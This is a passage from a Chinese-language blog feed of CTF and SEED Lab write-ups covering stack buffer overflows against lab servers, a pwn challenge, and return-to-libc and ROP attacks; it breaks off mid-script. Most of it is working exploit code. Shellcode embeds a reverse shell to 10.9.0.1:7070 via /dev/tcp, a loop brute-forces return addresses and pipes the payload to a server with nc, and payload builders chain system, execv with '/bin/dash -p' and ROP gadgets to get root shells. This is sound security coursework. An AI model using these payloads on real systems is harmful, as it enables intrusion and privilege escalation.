<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/echo-hello-server3.png" alt="echo-hello-server3"></p>
<p>构造python脚本如下，已知rbp和buffer地址，将shellcode放在前面即可，此处直接设置start为0：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x7fffffffe720</span> - <span class="number">0x7fffffffe650</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>获取到root权限的shell：</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/echo-hello-server3.png" alt="echo-hello-server3"></p>
<h3 id="Task-5：Level-4-Attack"><a href="#Task-5：Level-4-Attack" class="headerlink" title="Task 5：Level-4 Attack"></a>Task 5：Level-4 Attack</h3><p>向server4发送nc连接请求，但是buffer size很小，由返回结果可知buffer size为0x60，为96长度，小于shellcode长度，因此考虑使用main函数fread参数的shellcode，由于地址离rbp较远且无法得知，因此尝试遍历爆破出结果，此处应尽量保证shellcode前有尽可能多的nop指令，所以start可以设置为末尾。</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/ehco-hello-server3.png" alt="ehco-hello-server3"></p>
<p>构造python脚本如下，使用循环向server4发送请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffe650</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x60</span> + <span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">  ret += <span class="number">40</span></span><br><span class="line">  <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">  content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">  <span class="comment">##################################################################</span></span><br><span class="line">  <span class="comment"># Write the content to a file</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;ret: <span class="subst">&#123;ret&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(os.system(<span class="string">&quot;cat badfile | nc 10.9.0.8 9090&quot;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>python运行如下，结果会停在某个地址，表示在此ret地址下可以成功建立连接。</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/level4-result-1.png" alt="level4-result-1"></p>
<p>获取server4 root权限shell：</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/level4-result-2.png" alt="level4-result-2"></p>
<h3 id="Task-6-Experimenting-with-the-Address-Randomization"><a href="#Task-6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task 6: Experimenting with the Address Randomization"></a>Task 6: Experimenting with the Address Randomization</h3><p>开启ASLR机制后，向server1和server2发送<code>echo hello | nc 10.9.0.* 9090</code>请求，查看rbp和buffer地址。</p>
<p> <code>server1</code></p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver1.png" alt="开启ASLR后server1"></p>
<p><code>server2</code></p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/%E5%BC%80%E5%90%AFASLR%E5%90%8Eserver2.png" alt="image-20231024231535611"></p>
<p>可以看出rbp和buffer地址每次都会改变，即ASLR机制会在程序加载时随机化程序在内存地址</p>
<p>尝试暴力破解：（运行17分钟没有爆破成功…）</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3.png" alt="暴力破解"></p>
<h3 id="Tasks-7-Experimenting-with-Other-Countermeasures"><a href="#Tasks-7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Tasks 7: Experimenting with Other Countermeasures"></a>Tasks 7: Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 7.a: Turn on the StackGuard Protection</strong>  </p>
<p>setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
<li><p><strong>Task 7.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p> setuid实验已完成此项重复内容，此处不在赘述</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>缓冲区溢出</tag>
        <tag>SEED_Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016 WriteUp</title>
    <url>/posts/3d8ffbc0.html</url>
    <content><![CDATA[<h1 id="get-started-3dsctf-2016-WriteUp"><a href="#get-started-3dsctf-2016-WriteUp" class="headerlink" title="get_started_3dsctf_2016 WriteUp"></a>get_started_3dsctf_2016 WriteUp</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>对栈溢出函数带参数的溢出理解</li>
</ul>
<h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
<li><p>使用<code>checksec</code>工具查看基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ~/.local/bin/checksec ./get_started_3dsctf_2016</span><br><span class="line">[*] &#x27;/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>可以看到为32位程序，只开了nx防护。</p>
</li>
<li><p>ida工具打开程序，反编译，有主要函数<code>main</code>，<code>get_flag</code></p>
<p><code>main</code>：</p>
<p><img src="/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/main.png" alt="main"></p>
<p><code>get_flag</code>：</p>
<p><img src="/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/get_flag.png" alt="get_flag"></p>
<p>存在漏洞点为<code>main</code>函数中的<code>gets(v4)</code>，因此可以通过此进行栈溢出将返回地址改为<code>get_flag</code>函数地址，获取flag</p>
</li>
<li><p>在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：</p>
<p><img src="/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/%E8%BF%9C%E7%A8%8B-%E6%9C%89%E9%97%AE%E9%A2%98.png" alt="远程-有问题"></p>
</li>
<li><p>考虑在<code>get_flag</code>后加上<code>exit</code>函数以及<code>get_flag</code>所需的两个参数，使其正常完成并退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 25523)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span></span><br><span class="line">retn = <span class="number">0x08048A40</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x8048A3B&#x27;)</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>, get_flag, exit)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取flag</p>
<p><img src="/img/posts/2023-11-10-get_started_3dsctf_2016_WriteUp/images/results.png" alt="results"></p>
</li>
<li><p>另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】Return_to_Libc实验报告</title>
    <url>/posts/53f1e8f.html</url>
    <content><![CDATA[<h1 id="Return-to-Libc实验报告"><a href="#Return-to-Libc实验报告" class="headerlink" title="Return_to_Libc实验报告"></a>Return_to_Libc实验报告</h1><h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
<li><p>获取system函数和exit函数地址</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/%E8%8E%B7%E5%8F%96system%E5%92%8Cexit%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="获取system和exit函数地址"></p>
</li>
<li><p>gdb批处理命令，新建文件<code>peda-session-retlib.txt</code>，进行批处理操作</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/batch%E5%A4%84%E7%90%86gdb.png" alt="batch处理gdb"></p>
</li>
</ol>
<h3 id="Task2：Putting-the-shell-string-in-the-memory"><a href="#Task2：Putting-the-shell-string-in-the-memory" class="headerlink" title="Task2：Putting the shell string in the memory"></a>Task2：Putting the shell string in the memory</h3><ol>
<li><p>编写<code>getprt.c</code>来获取环境变量地址</p>
<p><code>getprt.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (shell)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置<code>/bin/sh</code>的环境变量，获得地址：</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/getprt.png" alt="getprt"></p>
<p>将代码加入到retlib.c中，获取到地址，可以发现地址与<code>getprt</code>的地址相同。（如果开启aslr或者两文件名长度不同则会不同）</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/retlib.png" alt="retlib"></p>
<h3 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h3><ol>
<li><p>构造python脚本，进行攻击</p>
<p><code>exploit.py</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Y = <span class="number">0xffffcd58</span> - <span class="number">0xffffcd40</span> + <span class="number">4</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span>   <span class="comment"># The address of system()</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (system_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = Y + <span class="number">8</span></span><br><span class="line">sh_addr = <span class="number">0xffffd3e5</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (sh_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = Y + <span class="number">4</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>攻击结果如下：</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/exploit.png" alt="exploit"></p>
</li>
<li><p>Attack variation 1: 删去exit()函数地址 ，发现虽然可以成功获取命令行，但是无法正常退出。</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/%E5%88%A0%E5%8E%BBexit.png" alt="删去exit"></p>
</li>
<li><p>Attack variation 2:修改retlib函数长度为newretlib，发现地址发生变化，无法正确执行命令。</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/%E4%BF%AE%E6%94%B9%E9%95%BF%E5%BA%A6.png" alt="修改长度"></p>
</li>
</ol>
<h3 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h3><ol>
<li><p>将&#x2F;bin&#x2F;sh与&#x2F;bin&#x2F;dash链接，重新进行实验。</p>
<p>虽然&#x2F;bin&#x2F;sh和&#x2F;bin&#x2F;dash都会对用户setuid权限进行检查，导致无法获取到root权限，但是如果加上-p参数，就可以绕过。可以让程序直接执行”&#x2F;bin&#x2F;dash -p”命令获取root权限。</p>
</li>
<li><p>获取execv函数地址：</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/execv%E5%9C%B0%E5%9D%80.png" alt="execv地址"></p>
</li>
<li><p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>))</span><br><span class="line"></span><br><span class="line">start = <span class="number">28</span></span><br><span class="line"></span><br><span class="line">execv_addr = <span class="number">0xf7e994b0</span>    <span class="comment"># The address of system()</span></span><br><span class="line">content[start:start+<span class="number">4</span>] = (execv_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The first argument of execv()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[start+<span class="number">4</span>:start+<span class="number">8</span>] = (exit_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bash_addr = <span class="number">0xffffd3e2</span>       <span class="comment"># The address of &quot;/bin/dash&quot;</span></span><br><span class="line">p_addr = <span class="number">0xffffde99</span> <span class="comment"># The address of &quot;-p&quot;</span></span><br><span class="line">content[start+<span class="number">8</span>:start+<span class="number">12</span>] = (bash_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The second argument of execv()</span></span><br><span class="line">argv = <span class="number">0xffffcd78</span> + <span class="number">504</span>   <span class="comment"># address of argv[]</span></span><br><span class="line">content[start+<span class="number">12</span>: start+<span class="number">16</span>] = (argv).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Construct the argv[] array</span></span><br><span class="line">arg1_addr = bash_addr</span><br><span class="line">arg2_addr = p_addr</span><br><span class="line">arg3_addr = <span class="number">0x0</span></span><br><span class="line">content[<span class="number">504</span>: <span class="number">508</span>] = (arg1_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">508</span>: <span class="number">512</span>] = (arg2_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">512</span>: <span class="number">516</span>] = (arg3_addr).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
</li>
<li><p>成功获取root权限shell</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90.png" alt="获取权限"></p>
</li>
</ol>
<h3 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h3><ol>
<li><p>ROP攻击实验一（无参数串接函数）</p>
<p>无参数ROP传递链构造比较简单，因为正常情况下在正常执行函数后esp指针自动指向下一帧，所以只需将bar函数的地址按序填入返回地址10次即可。</p>
<p>构造脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">bar_addr = <span class="number">0x565562d0</span>    <span class="comment"># The address of foo()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># foo*10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  content += (bar_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += (exit_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/ROP_1_results.png" alt="ROP_1_results"></p>
</li>
<li><p>ROP攻击实验二（存在参数）</p>
<p>思路：通过跳过前序操作来实现，每一次调用函数都会跳过其对ebp操作两个指令，从而ebp无法压栈，因此可以直接填入参数，函数执行完毕后ebp可以跳转到下一个函数位置（跳过前序操作），继续执行。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">baz_skip_addr = <span class="number">0x56556315</span> + <span class="number">7</span>    <span class="comment"># The address of baz(skip)</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span>  <span class="comment"># foo()&#x27;s frame pointer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span 